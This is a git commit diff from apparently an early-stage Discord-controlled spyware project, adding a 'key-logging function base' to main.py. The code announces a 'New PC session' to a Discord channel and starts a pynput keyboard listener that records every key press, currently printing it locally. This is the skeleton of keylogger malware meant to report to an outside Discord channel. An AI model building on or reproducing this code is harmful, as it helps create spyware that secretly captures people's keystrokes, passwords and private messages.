ef9220275a7f0877830f9e22434446c1909964ee
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2022-11-20 21:03:33 +0100

    Added key-logging function base

--- main.py
+++ main.py
@@ -1,14 +1,20 @@
 import discord
+from pynput.keyboard import Key, Listener
 
 client = discord.Client()
 bot_token = ''   # Paste here BOT-token
 
 channel_ids = {
-    'main': 831567586344697868
+    'main': 831567586344697868   # Paste here main channel ID
 }
 
 @client.event 
 async def on_ready():  
     await client.get_channel(channel_ids['main']).send('New PC session')
 
-client.run(bot_token)
+def on_press(key):
+    print(key)
+
+with Listener(on_press=on_press) as listener:
+    client.run(bot_token)
+    listener.join()
